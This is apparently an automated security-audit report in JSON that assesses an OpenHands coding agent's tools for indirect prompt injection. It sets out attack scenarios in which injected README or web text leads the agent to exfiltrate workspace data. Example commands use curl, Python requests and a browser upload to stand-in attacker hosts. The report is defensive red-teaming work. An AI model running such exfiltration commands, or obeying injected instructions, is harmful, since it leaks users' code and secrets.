{
  "json_path": "/srv/home/shiqiu/AgentXploit/src/analysis_agent/reports/analysis_7929_20260120_180248.json",
  "created_at": "2026-01-20 18:02:51",
  "last_updated": "2026-01-20 18:09:56",
  "status": "completed",
  "environment": {
    "framework": "OpenHands custom agent framework",
    "docker_required": true,
    "entry_points": [
      "pyproject.toml",
      "openhands/cli/main.py",
      "openhands/server/app.py"
    ],
    "config_files": [
      "config.toml",
      "config.template.toml",
      "pyproject.toml",
      "poetry.lock",
      "docker-compose.yml"
    ]
  },
  "dependencies": [
    "litellm",
    "aiohttp",
    "google-generativeai",
    "google-api-python-client",
    "google-auth-httplib2",
    "google-auth-oauthlib",
    "termcolor",
    "docker",
    "fastapi",
    "toml",
    "types-toml",
    "uvicorn",
    "numpy",
    "json-repair",
    "browsergym-core",
    "html2text",
    "pexpect",
    "jinja2",
    "python-multipart",
    "tenacity",
    "zope-interface",
    "pathspec",
    "pyjwt",
    "dirhash",
    "tornado",
    "python-dotenv",
    "rapidfuzz",
    "whatthepatch",
    "protobuf",
    "opentelemetry-api",
    "opentelemetry-exporter-otlp-proto-grpc",
    "libtmux",
    "pygithub",
    "joblib",
    "openhands-aci",
    "python-socketio",
    "sse-starlette",
    "psutil",
    "python-json-logger",
    "prompt-toolkit",
    "poetry",
    "anyio",
    "pythonnet",
    "fastmcp",
    "python-frontmatter",
    "shellingham",
    "ipywidgets",
    "qtconsole",
    "PyPDF2",
    "python-pptx",
    "pylatexenc",
    "python-docx",
    "bashlex",
    "redis",
    "minio",
    "stripe",
    "google-cloud-aiplatform",
    "anthropic[vertex]",
    "boto3",
    "kubernetes",
    "pyyaml",
    "memory-profiler",
    "jupyter_kernel_gateway",
    "e2b",
    "modal",
    "runloop-api-client",
    "daytona",
    "jupyterlab",
    "notebook",
    "flake8",
    "streamlit",
    "whatthepatch",
    "retry",
    "evaluate",
    "visualswebench",
    "swegym",
    "commit0",
    "func_timeout",
    "sympy",
    "gdown",
    "matplotlib",
    "seaborn",
    "tabulate",
    "browsergym",
    "browsergym-webarena",
    "browsergym-miniwob",
    "browsergym-visualwebarena",
    "boto3-stubs[s3]",
    "pyarrow",
    "datasets",
    "joblib",
    "swebench",
    "fuzzywuzzy",
    "rouge",
    "python-levenshtein",
    "tree-sitter-python"
  ],
  "tools": [
    {
      "tool_name": "execute_bash",
      "analyzed_at": "2026-01-20 18:07:05",
      "tool_info": {
        "tool_name": "execute_bash",
        "position": "openhands/agenthub/codeact_agent/tools/bash.py::create_cmd_run_tool",
        "description": "Exposes a persistent shell where the LLM can run arbitrary bash commands or interact with running processes.",
        "functionality": "Returns a LiteLLM ChatCompletionToolParam describing the `execute_bash` function so the LLM can either execute a fresh bash command or send input/interrupts to an in-flight process inside the sandboxed tmux session.",
        "parameters": [
          {
            "name": "command",
            "type": "string",
            "purpose": "Exact bash command to execute, or empty string/CTRL sequences to interact with a previous process."
          },
          {
            "name": "is_input",
            "type": "enum('true','false')",
            "purpose": "Indicates whether the payload should be treated as stdin input to the currently running process."
          },
          {
            "name": "timeout",
            "type": "number",
            "purpose": "Optional hard timeout (seconds) after which the runtime will abort the command."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Tool schema consumed by LiteLLM so the assistant can call into the runtime via CmdRunAction."
      },
      "dataflow": {
        "tool_name": "execute_bash",
        "position": "openhands/agenthub/codeact_agent/tools/bash.py::create_cmd_run_tool",
        "data_sources": [
          "user_input",
          "LLM_output"
        ],
        "data_destinations": [
          "bash_command",
          "filesystem",
          "network_write",
          "user_output"
        ],
        "data_transformations": [
          "parsing",
          "sanitization",
          "timeout_enforcement"
        ],
        "flow_description": "User requests flow into the LLM prompt; when the model chooses the execute_bash tool, its arguments are parsed and turned into CmdRunAction objects. The runtime executes the command in a persistent tmux shell, streaming stdout/stderr back to the agent, and allowing follow-up inputs or interrupts. Outputs are rendered to the user and may affect the filesystem or network.",
        "sensitive_flows": [
          {
            "from": "LLM_output",
            "to": "bash_command",
            "risk_level": "high",
            "reason": "LLM-decided shell commands run with sandbox privileges could exfiltrate data or mutate environment without validation."
          }
        ]
      },
      "vulnerabilities": {
        "has_vulnerabilities": true,
        "vulnerabilities": [
          {
            "type": "LLM_output_to_sensitive_tool",
            "severity": "high",
            "description": "LLM-crafted commands are executed directly in a persistent shell (CmdRunAction) without validation or allow/deny lists.",
            "attack_scenario": "An indirect prompt injection from a README convinces the LLM to run `tar czf /tmp/leak /workspace && curl attacker --upload-file /tmp/leak`, exfiltrating repo data.",
            "end_to_end_impact": [
              "Remote code execution within the sandboxed workspace",
              "Potential data exfiltration over network-accessible commands"
            ],
            "evidence": "function_calling.py converts tool arguments straight into CmdRunAction and runtime/action_execution_server.py executes them via BashSession.",
            "mitigation": "Enforce command allow-lists, validate paths, or interpose human approval before executing high-risk commands."
          }
        ],
        "injection_vectors": [
          {
            "type": "prompt_injection",
            "source": "file_read/web_content",
            "destination": "LLM_output",
            "severity": "high",
            "exploitability": "easy"
          }
        ],
        "threat_model": [
          "untrusted repository content",
          "malicious websites"
        ],
        "overall_risk": "high",
        "risk_summary": "Shell execution is delegated entirely to the LLM, so any indirect prompt injection that reaches the model can run arbitrary commands in the sandbox."
      }
    },
    {
      "tool_name": "execute_ipython_cell",
      "analyzed_at": "2026-01-20 18:07:19",
      "tool_info": {
        "tool_name": "execute_ipython_cell",
        "position": "openhands/agenthub/codeact_agent/tools/ipython.py::IPythonTool",
        "description": "Provides an interactive IPython/Jupyter cell execution surface inside the sandbox for running arbitrary Python code.",
        "functionality": "Defines the LiteLLM function metadata for `execute_ipython_cell`, letting the LLM submit Python snippets (including magics like %pip) which ActionExecutor forwards to the Jupyter plugin for execution with persistent state.",
        "parameters": [
          {
            "name": "code",
            "type": "string",
            "purpose": "Python source (single cell) to run inside the shared IPython kernel."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Tool schema consumed by LiteLLM so the assistant can trigger IPythonRunCellAction in the runtime."
      },
      "dataflow": {
        "tool_name": "execute_ipython_cell",
        "position": "openhands/agenthub/codeact_agent/tools/ipython.py::IPythonTool",
        "data_sources": [
          "user_input",
          "LLM_output",
          "workspace_files"
        ],
        "data_destinations": [
          "python_interpreter",
          "filesystem",
          "network_write",
          "user_output"
        ],
        "data_transformations": [
          "parsing",
          "execution",
          "stdout_capture"
        ],
        "flow_description": "The LLM emits a tool call with Python code that becomes an IPythonRunCellAction. ActionExecutor routes it to the Jupyter plugin, which runs the code in a persistent interpreter that can import modules, read/write workspace files, and make network calls. Execution results are captured and surfaced back to the agent/user.",
        "sensitive_flows": [
          {
            "from": "LLM_output",
            "to": "python_interpreter",
            "risk_level": "high",
            "reason": "Arbitrary Python with full workspace access executes without validation, enabling code injection and data exfiltration."
          }
        ]
      },
      "vulnerabilities": {
        "has_vulnerabilities": true,
        "vulnerabilities": [
          {
            "type": "LLM_output_to_sensitive_tool",
            "severity": "high",
            "description": "LLM-provided Python runs inside a shared IPython kernel with filesystem and network access and no policy guardrails.",
            "attack_scenario": "Injected instructions lead the LLM to call `execute_ipython_cell` with `import shutil, requests; shutil.make_archive('/tmp/leak','zip','/workspace'); requests.post(attacker, files={'f':open('/tmp/leak.zip','rb')})`.",
            "end_to_end_impact": [
              "Execution of arbitrary Python code beyond bash sandbox restrictions",
              "Bulk data exfiltration or credential theft from environment"
            ],
            "evidence": "function_calling.py maps the tool call to IPythonRunCellAction and runtime/action_execution_server.py runs it via JupyterPlugin without validation.",
            "mitigation": "Introduce policy filters or capability sandboxing (whitelists, membrane Jupyter kernels, human review for sensitive operations)."
          }
        ],
        "injection_vectors": [
          {
            "type": "prompt_injection",
            "source": "workspace_files/web_results",
            "destination": "LLM_output",
            "severity": "high",
            "exploitability": "easy"
          }
        ],
        "threat_model": [
          "malicious repository content",
          "compromised browsing targets"
        ],
        "overall_risk": "high",
        "risk_summary": "Because the Jupyter kernel executes raw LLM code, an attacker controlling prompt context can obtain arbitrary Python execution with persistent state."
      }
    },
    {
      "tool_name": "browser",
      "analyzed_at": "2026-01-20 18:07:36",
      "tool_info": {
        "tool_name": "browser",
        "position": "openhands/agenthub/codeact_agent/tools/browser.py::BrowserTool",
        "description": "Lets the LLM drive the BrowserGym environment by emitting Python mini-programs composed of high-level DOM actions (goto, click, fill, etc.).",
        "functionality": "Defines the BrowserGym action space as a LiteLLM tool so the assistant can submit multi-line Python code strings that enqueue navigation, interaction, and file upload actions; the runtime converts these into BrowseInteractiveAction events executed by BrowserEnv.",
        "parameters": [
          {
            "name": "code",
            "type": "string",
            "purpose": "Python instructions containing BrowserGym helper calls (goto, click, fill, etc.) to manipulate the page or view local files."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Tool schema enabling the LLM to call BrowserTool and generate BrowseInteractiveAction events."
      },
      "dataflow": {
        "tool_name": "browser",
        "position": "openhands/agenthub/codeact_agent/tools/browser.py::BrowserTool",
        "data_sources": [
          "LLM_output",
          "web_content",
          "workspace_files"
        ],
        "data_destinations": [
          "browser_env",
          "network_write",
          "file_download",
          "user_output"
        ],
        "data_transformations": [
          "python_interpretation",
          "action_queueing",
          "observation_capture"
        ],
        "flow_description": "The LLM encodes BrowserGym commands into the `code` parameter. ActionExecutor queues these through BrowseInteractiveAction, which BrowserEnv interprets to control a real browser. Page DOM, network responses, and downloads feed back as observations or actual files copied into /workspace.",
        "sensitive_flows": [
          {
            "from": "web_content",
            "to": "LLM_output",
            "risk_level": "medium",
            "reason": "Malicious sites can inject instructions into DOM that the LLM reads and obeys."
          },
          {
            "from": "LLM_output",
            "to": "browser_env",
            "risk_level": "high",
            "reason": "LLM-constructed scripts can upload local files or navigate to attacker URLs."
          }
        ]
      },
      "vulnerabilities": {
        "has_vulnerabilities": true,
        "vulnerabilities": [
          {
            "type": "prompt_injection",
            "severity": "high",
            "description": "Web content is read verbatim and turned into BrowserGym commands without sanitizing hidden instructions, enabling indirect prompt injection to drive subsequent actions.",
            "attack_scenario": "An attacker-controlled webpage rendered in BrowserGym contains text telling the model to `goto('https://evil/upload')` and `upload_file('form', '/workspace/secrets.env')`; the LLM copies/pastes this into the next tool call.",
            "end_to_end_impact": [
              "Forced navigation to malicious hosts",
              "Automatic upload of local files obtained via other tools"
            ],
            "evidence": "browser.py exposes 15 action helpers and runtime/action_execution_server.py executes them directly; no filtering exists between DOM text and LLM prompt.",
            "mitigation": "Apply content sanitization, enforce allowlisted domains, or require user consent before high-risk actions like upload_file."
          }
        ],
        "injection_vectors": [
          {
            "type": "indirect_prompt_injection",
            "source": "web_content",
            "destination": "LLM_output",
            "severity": "high",
            "exploitability": "easy"
          }
        ],
        "threat_model": [
          "malicious websites",
          "MITM content injection"
        ],
        "overall_risk": "high",
        "risk_summary": "Browsing results are fed straight back to the LLM, so hostile pages can rewrite the agent's future tool invocations without detection."
      }
    },
    {
      "tool_name": "edit_file",
      "analyzed_at": "2026-01-20 18:07:58",
      "tool_info": {
        "tool_name": "edit_file",
        "position": "openhands/agenthub/codeact_agent/tools/llm_based_edit.py::LLMBasedFileEditTool",
        "description": "Legacy LLM-based file editor where the assistant supplies a draft of file contents plus line range to replace.",
        "functionality": "Provides the LiteLLM metadata for the `edit_file` tool; when invoked, the runtime maps it to FileEditAction with impl_source LLM_BASED_EDIT, allowing free-form rewriting of arbitrary file slices or entire files.",
        "parameters": [
          {
            "name": "path",
            "type": "string",
            "purpose": "Absolute path of the file to edit or create."
          },
          {
            "name": "content",
            "type": "string",
            "purpose": "Draft replacement text (allowing placeholders like '# ... existing code ...')."
          },
          {
            "name": "start",
            "type": "integer",
            "purpose": "1-indexed start line for the edit, -1 meaning append."
          },
          {
            "name": "end",
            "type": "integer",
            "purpose": "1-indexed end line, -1 meaning end of file."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Schema enabling the assistant to send structured file edits via LiteLLM."
      },
      "dataflow": {
        "tool_name": "edit_file",
        "position": "openhands/agenthub/codeact_agent/tools/llm_based_edit.py::LLMBasedFileEditTool",
        "data_sources": [
          "LLM_output",
          "workspace_files"
        ],
        "data_destinations": [
          "filesystem",
          "user_output"
        ],
        "data_transformations": [
          "diff_generation",
          "content_replacement"
        ],
        "flow_description": "The LLM selects a file, content draft, and line span; function_calling.py converts this to FileEditAction which runtime/action_execution_server.py executes via the OH editor. The file is overwritten immediately, with diffs returned to the agent.",
        "sensitive_flows": [
          {
            "from": "LLM_output",
            "to": "filesystem",
            "risk_level": "medium",
            "reason": "Arbitrary edits can delete or corrupt files, but stay within the workspace sandbox."
          }
        ]
      },
      "vulnerabilities": {
        "has_vulnerabilities": false,
        "overall_risk": "medium",
        "risk_summary": "Tool allows arbitrary file modifications but within the sandbox; primary risk is integrity, already inherent to writable workspace."
      }
    },
    {
      "tool_name": "str_replace_editor",
      "analyzed_at": "2026-01-20 18:08:17",
      "tool_info": {
        "tool_name": "str_replace_editor",
        "position": "openhands/agenthub/codeact_agent/tools/str_replace_editor.py::create_str_replace_editor_tool",
        "description": "Custom multi-command file tool that supports viewing, creating, string replacements, inserts, and undo over local files.",
        "functionality": "The factory emits a LiteLLM tool definition for `str_replace_editor` whose commands are mapped in function_calling.py either to FileReadAction (view) or FileEditAction (create/str_replace/insert/undo) backed by the OH ACI editor runtime.",
        "parameters": [
          {
            "name": "command",
            "type": "enum('view','create','str_replace','insert','undo_edit')",
            "purpose": "Selects the sub-operation."
          },
          {
            "name": "path",
            "type": "string",
            "purpose": "Absolute file or directory target."
          },
          {
            "name": "file_text",
            "type": "string",
            "purpose": "Content for create command."
          },
          {
            "name": "old_str",
            "type": "string",
            "purpose": "Exact snippet to replace when using str_replace."
          },
          {
            "name": "new_str",
            "type": "string",
            "purpose": "Replacement text or inserted snippet."
          },
          {
            "name": "insert_line",
            "type": "integer",
            "purpose": "Line after which to insert new_str."
          },
          {
            "name": "view_range",
            "type": "array[int]",
            "purpose": "Optional [start,end] lines when viewing files."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Schema enabling the assistant to invoke the structured editor through LiteLLM."
      },
      "dataflow": {
        "tool_name": "str_replace_editor",
        "position": "openhands/agenthub/codeact_agent/tools/str_replace_editor.py::create_str_replace_editor_tool",
        "data_sources": [
          "LLM_output"
        ],
        "data_destinations": [
          "filesystem",
          "user_output"
        ],
        "data_transformations": [
          "command_dispatch",
          "string_replacement",
          "diff_generation"
        ],
        "flow_description": "The LLM's tool call specifies a sub-command and attributes; function_calling.py validates keys and builds FileReadAction or FileEditAction. ActionExecutor uses the OH ACI editor to inspect or mutate files, returning editor output/diffs to the user.",
        "sensitive_flows": [
          {
            "from": "LLM_output",
            "to": "filesystem",
            "risk_level": "medium",
            "reason": "Arbitrary file changes can affect build integrity but are confined to workspace."
          }
        ]
      }
    },
    {
      "tool_name": "finish",
      "analyzed_at": "2026-01-20 18:08:26",
      "tool_info": {
        "tool_name": "finish",
        "position": "openhands/agenthub/codeact_agent/tools/finish.py::FinishTool",
        "description": "Signals that the agent is done and provides a final message/status to the user.",
        "functionality": "Defines the LiteLLM schema for FINISH, allowing the LLM to send a completion summary plus task_completed flag; function_calling.py translates it into AgentFinishAction for the controller.",
        "parameters": [
          {
            "name": "message",
            "type": "string",
            "purpose": "Explanation of outcome."
          },
          {
            "name": "task_completed",
            "type": "enum('true','false','partial')",
            "purpose": "Self-assessed completion status."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Tool schema enabling finalization messages."
      },
      "dataflow": {
        "tool_name": "finish",
        "position": "openhands/agenthub/codeact_agent/tools/finish.py::FinishTool",
        "data_sources": [
          "LLM_output"
        ],
        "data_destinations": [
          "user_output",
          "conversation_state"
        ],
        "data_transformations": [
          "formatting"
        ],
        "flow_description": "LLM calls the finish tool with a final narrative and status; the controller wraps it into AgentFinishAction and surfaces it to the user/UI, also closing the session.",
        "sensitive_flows": []
      }
    },
    {
      "tool_name": "think",
      "analyzed_at": "2026-01-20 18:08:34",
      "tool_info": {
        "tool_name": "think",
        "position": "openhands/agenthub/codeact_agent/tools/think.py::ThinkTool",
        "description": "Out-of-band reflection tool that logs the model's reasoning without performing side effects.",
        "functionality": "Registers a `think` function so the LLM can emit structured thought text; function_calling.py maps it to AgentThinkAction which stores the explanation for transparency.",
        "parameters": [
          {
            "name": "thought",
            "type": "string",
            "purpose": "Free-form reasoning text."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Tool schema enabling the assistant to emit AgentThinkAction events."
      },
      "dataflow": {
        "tool_name": "think",
        "position": "openhands/agenthub/codeact_agent/tools/think.py::ThinkTool",
        "data_sources": [
          "LLM_output"
        ],
        "data_destinations": [
          "conversation_state",
          "user_output"
        ],
        "data_transformations": [
          "logging"
        ],
        "flow_description": "The LLM uses the think tool to record intermediate reasoning; it becomes an AgentThinkAction appended to history and optionally shown to the user or used by condensers.",
        "sensitive_flows": []
      }
    },
    {
      "tool_name": "request_condensation",
      "analyzed_at": "2026-01-20 18:08:40",
      "tool_info": {
        "tool_name": "request_condensation",
        "position": "openhands/agenthub/codeact_agent/tools/condensation_request.py::CondensationRequestTool",
        "description": "Asks the controller to condense conversation history when context grows too large.",
        "functionality": "Provides a parameter-less tool hook that the LLM can call; function_calling.py turns it into CondensationRequestAction which triggers the condenser pipeline.",
        "parameters": [],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Tool schema enabling history condensation requests."
      },
      "dataflow": {
        "tool_name": "request_condensation",
        "position": "openhands/agenthub/codeact_agent/tools/condensation_request.py::CondensationRequestTool",
        "data_sources": [
          "LLM_output",
          "conversation_state"
        ],
        "data_destinations": [
          "conversation_state"
        ],
        "data_transformations": [
          "summarization"
        ],
        "flow_description": "When the LLM invokes request_condensation, the controller emits a CondensationRequestAction that runs condensers to summarize prior events and shrink future prompts.",
        "sensitive_flows": []
      }
    },
    {
      "tool_name": "grep",
      "analyzed_at": "2026-01-20 18:08:48",
      "tool_info": {
        "tool_name": "grep",
        "position": "openhands/agenthub/readonly_agent/tools/grep.py::GrepTool",
        "description": "Read-only regex search across files via ripgrep with optional path/include filters.",
        "functionality": "Defines a LiteLLM tool for pattern searching; readonly_agent/function_calling.py converts calls into CmdRunAction executing ripgrep (rg) limited to 100 results, surfacing matches without altering files.",
        "parameters": [
          {
            "name": "pattern",
            "type": "string",
            "purpose": "Regex to search within file contents."
          },
          {
            "name": "path",
            "type": "string",
            "purpose": "Optional root directory for search."
          },
          {
            "name": "include",
            "type": "string",
            "purpose": "Glob filter for files to search."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Schema enabling read-only search operations."
      },
      "dataflow": {
        "tool_name": "grep",
        "position": "openhands/agenthub/readonly_agent/tools/grep.py::GrepTool",
        "data_sources": [
          "LLM_output",
          "workspace_files"
        ],
        "data_destinations": [
          "CmdRunAction",
          "user_output"
        ],
        "data_transformations": [
          "shell_command_generation",
          "search_results_formatting"
        ],
        "flow_description": "LLM tool calls are converted to `rg` shell commands that run in the sandbox and stream text matches back to the agent. Outputs are informational only; no write operations occur.",
        "sensitive_flows": [
          {
            "from": "workspace_files",
            "to": "user_output",
            "risk_level": "low",
            "reason": "Search results may include sensitive strings but agent is expected to have access already."
          }
        ]
      }
    },
    {
      "tool_name": "glob",
      "analyzed_at": "2026-01-20 18:09:01",
      "tool_info": {
        "tool_name": "glob",
        "position": "openhands/agenthub/readonly_agent/tools/glob.py::GlobTool",
        "description": "Lists files matching a glob pattern (via ripgrep --files) without modifying the filesystem.",
        "functionality": "When the LLM invokes the glob tool, function_calling.py builds an `rg --files -g pattern` command limited to 100 entries, executes it through CmdRunAction, and provides the file list back to the agent.",
        "parameters": [
          {
            "name": "pattern",
            "type": "string",
            "purpose": "Glob such as '**/*.py'."
          },
          {
            "name": "path",
            "type": "string",
            "purpose": "Optional root directory for the search; defaults to cwd."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Schema enabling read-only file discovery."
      },
      "dataflow": {
        "tool_name": "glob",
        "position": "openhands/agenthub/readonly_agent/tools/glob.py::GlobTool",
        "data_sources": [
          "LLM_output",
          "filesystem_metadata"
        ],
        "data_destinations": [
          "CmdRunAction",
          "user_output"
        ],
        "data_transformations": [
          "shell_command_generation",
          "path_listing"
        ],
        "flow_description": "Tool arguments become `rg --files` shell invocations limited to 100 paths; results are streamed back for inspection without touching file contents.",
        "sensitive_flows": []
      }
    },
    {
      "tool_name": "view",
      "analyzed_at": "2026-01-20 18:09:09",
      "tool_info": {
        "tool_name": "view",
        "position": "openhands/agenthub/readonly_agent/tools/view.py::ViewTool",
        "description": "Read-only file/directory viewer with optional line ranges.",
        "functionality": "Tool calls map to FileReadAction (impl_source OH_ACI) that either dumps `cat -n` of a file or lists directory contents; supports view_range to limit large files and returns data without side effects.",
        "parameters": [
          {
            "name": "path",
            "type": "string",
            "purpose": "Absolute file or directory path."
          },
          {
            "name": "view_range",
            "type": "array[int]",
            "purpose": "Optional [start,end] line numbers when path is a file."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Schema enabling safe reads via the OH editor backend."
      },
      "dataflow": {
        "tool_name": "view",
        "position": "openhands/agenthub/readonly_agent/tools/view.py::ViewTool",
        "data_sources": [
          "workspace_files"
        ],
        "data_destinations": [
          "user_output"
        ],
        "data_transformations": [
          "line_numbering",
          "range_selection"
        ],
        "flow_description": "The OH editor reads the requested path (cat -n for files, directory listing otherwise) and sends the textual output back to the agent; no mutations occur.",
        "sensitive_flows": [
          {
            "from": "workspace_files",
            "to": "user_output",
            "risk_level": "medium",
            "reason": "Viewing may expose secrets in files, though agent already has repo access."
          }
        ]
      }
    },
    {
      "tool_name": "search_code_snippets",
      "analyzed_at": "2026-01-20 18:09:21",
      "tool_info": {
        "tool_name": "search_code_snippets",
        "position": "openhands/agenthub/loc_agent/tools/search_content.py::SearchRepoTool",
        "description": "LOC agent helper that queries precomputed embeddings/indexes for code snippets by keywords or line numbers.",
        "functionality": "Defines a LiteLLM tool for semantic/line-number search over a code graph; loc_agent/function_calling.py wraps calls into IPythonRunCellAction executing helper functions (search_code_snippets) inside agent-skills (Jupyter) rather than local shell.",
        "parameters": [
          {
            "name": "search_terms",
            "type": "array[string]",
            "purpose": "Keywords or snippet names to look up."
          },
          {
            "name": "line_nums",
            "type": "array[int]",
            "purpose": "Specific line numbers to pull context for within file_path_or_pattern."
          },
          {
            "name": "file_path_or_pattern",
            "type": "string",
            "purpose": "Glob or file path filter (defaults **/*.py)."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Tool schema enabling Jupyter-backed repository search."
      },
      "dataflow": {
        "tool_name": "search_code_snippets",
        "position": "openhands/agenthub/loc_agent/tools/search_content.py::SearchRepoTool",
        "data_sources": [
          "precomputed_code_graph",
          "workspace_files"
        ],
        "data_destinations": [
          "Jupyter_python",
          "user_output"
        ],
        "data_transformations": [
          "query_execution",
          "result_serialization"
        ],
        "flow_description": "The LLM issues search parameters; loc_agent/function_calling.py constructs IPython code that invokes agent skills functions (e.g., search_code_snippets) within the Jupyter kernel, which query indexed repository data and return structured snippets to the agent.",
        "sensitive_flows": [
          {
            "from": "workspace_files",
            "to": "user_output",
            "risk_level": "medium",
            "reason": "Search results might include confidential code but the agent already has access."
          }
        ]
      }
    },
    {
      "tool_name": "get_entity_contents",
      "analyzed_at": "2026-01-20 18:09:31",
      "tool_info": {
        "tool_name": "get_entity_contents",
        "position": "openhands/agenthub/loc_agent/tools/search_content.py::SearchEntityTool",
        "description": "Fetches full definitions of specified entities (files, classes, functions) from the indexed code graph.",
        "functionality": "Tool metadata for `get_entity_contents`; loc_agent/function_calling.py routes calls into IPython-run helper functions that retrieve stored entity bodies (file_path:QualifiedName) from the LOC analyzer and print them back.",
        "parameters": [
          {
            "name": "entity_names",
            "type": "array[string]",
            "purpose": "Identifiers like 'src/file.py:Class.method' or raw file paths."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Schema enabling entity-level lookups via agent skills."
      },
      "dataflow": {
        "tool_name": "get_entity_contents",
        "position": "openhands/agenthub/loc_agent/tools/search_content.py::SearchEntityTool",
        "data_sources": [
          "code_graph_index"
        ],
        "data_destinations": [
          "Jupyter_python",
          "user_output"
        ],
        "data_transformations": [
          "lookup",
          "formatting"
        ],
        "flow_description": "Entity identifiers are passed to agent skill helpers executed inside the Jupyter kernel, which query the LOC index and return the full text of each entity for inspection.",
        "sensitive_flows": [
          {
            "from": "code_graph_index",
            "to": "user_output",
            "risk_level": "medium",
            "reason": "Exposes stored code fragments but the agent already has repository access."
          }
        ]
      }
    },
    {
      "tool_name": "explore_tree_structure",
      "analyzed_at": "2026-01-20 18:09:39",
      "tool_info": {
        "tool_name": "explore_tree_structure",
        "position": "openhands/agenthub/loc_agent/tools/explore_structure.py::create_explore_tree_structure_tool",
        "description": "Traverses the LOC code graph to return structured dependency trees around selected entities or directories.",
        "functionality": "Tool metadata enumerating arguments (start_entities, direction, traversal_depth, entity/dependency filters) so the LLM can request graph traversal. loc_agent/function_calling.py emits IPython code calling explore_tree_structure() from agent skills, which queries the graph and prints results.",
        "parameters": [
          {
            "name": "start_entities",
            "type": "array[string]",
            "purpose": "Root nodes (file paths, directories, or file:QualifiedName identifiers)."
          },
          {
            "name": "direction",
            "type": "enum('upstream','downstream','both')",
            "purpose": "Traversal direction relative to the roots."
          },
          {
            "name": "traversal_depth",
            "type": "integer",
            "purpose": "Depth bound (-1 for unlimited)."
          },
          {
            "name": "entity_type_filter",
            "type": "array[string]|null",
            "purpose": "Entity types to include (class, function, file, directory)."
          },
          {
            "name": "dependency_type_filter",
            "type": "array[string]|null",
            "purpose": "Relationship types (contains, imports, invokes, inherits)."
          }
        ],
        "return_type": "ChatCompletionToolParam",
        "return_description": "Schema enabling graph exploration via the LOC agent skills backend."
      },
      "dataflow": {
        "tool_name": "explore_tree_structure",
        "position": "openhands/agenthub/loc_agent/tools/explore_structure.py::create_explore_tree_structure_tool",
        "data_sources": [
          "code_graph_index"
        ],
        "data_destinations": [
          "Jupyter_python",
          "user_output"
        ],
        "data_transformations": [
          "graph_traversal",
          "serialization"
        ],
        "flow_description": "The LLM specifies traversal parameters; the LOC agent runs explore_tree_structure() inside Jupyter, walking the pre-built dependency graph and replying with structured relationships that inform localization.",
        "sensitive_flows": [
          {
            "from": "code_graph_index",
            "to": "user_output",
            "risk_level": "low",
            "reason": "Outputs reflect code metadata already available to the agent."
          }
        ]
      }
    }
  ],
  "final_summary": {
    "tools_analyzed": 14,
    "tools_with_vulnerabilities": 3,
    "vulnerability_counts": {
      "critical": 0,
      "high": 3,
      "medium": 0,
      "low": 0
    },
    "overall_risk": "high"
  }
}